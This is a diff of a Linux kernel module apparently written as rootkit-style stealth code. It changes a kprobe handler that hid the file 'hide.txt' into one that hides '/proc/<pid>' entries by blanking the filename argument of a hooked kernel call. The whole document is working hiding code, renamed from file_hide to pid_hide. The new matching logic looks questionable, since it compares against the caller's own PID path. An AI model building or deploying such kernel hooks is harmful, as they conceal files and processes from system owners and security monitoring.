@@ -5,11 +5,12 @@
  */
 
 #define pr_fmt(fmt) "%s: " fmt, __func__
-#define HIDE "hide.txt"
 
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/kprobes.h>
+#include <linux/sched.h>
+#include <linux/pid.h>
 
 #ifdef DEBUG
 #define dbg_print(fmt, ...) pr_info(fmt, ##__VA_ARGS__)
@@ -26,18 +27,26 @@ static struct kprobe kp = {
 static int __kprobes handler_pre(struct kprobe *p, struct pt_regs *regs)
 {
 	char *filename = (char *)regs->si;
+	pid_t pid = current->pid;
+	char path[256];
 
 	dbg_print(
 		"<%s> p->addr = 0x%p, ip = %lx, rdi=%lx, rsi=%s ,flags = 0x%lx\n",
 		p->symbol_name, p->addr, regs->ip, regs->di, (char *)regs->si,
 		regs->flags);
-	if (strcmp(filename, HIDE) == 0)
-		strcpy((char *)regs->si, "\x00");
+
+	// Convert current->pid to string and create /proc/[pid] path
+	snprintf(path, sizeof(path), "/proc/%d", pid);
+
+	dbg_print("PID: %d\n", pid);
+
+	if (strcmp(filename, path) == 0)
+		*((char *)regs->si) = '\0';
 
 	return 0;
 }
 
-static int __init file_hide_init(void)
+static int __init pid_hide_init(void)
 {
 	int ret;
 	kp.pre_handler = handler_pre;
@@ -51,13 +60,13 @@ static int __init file_hide_init(void)
 	return 0;
 }
 
-static void __exit file_hide_exit(void)
+static void __exit pid_hide_exit(void)
 {
 	unregister_kprobe(&kp);
-	pr_info("file_hide exit successfully\n");
+	pr_info("pid_hide exit successfully\n");
 }
 
-module_init(file_hide_init) module_exit(file_hide_exit)
+module_init(pid_hide_init) module_exit(pid_hide_exit)
 	MODULE_AUTHOR("MikeHorn-git");
-MODULE_DESCRIPTION("file_hide");
+MODULE_DESCRIPTION("pid_hide");
 MODULE_LICENSE("GPL");
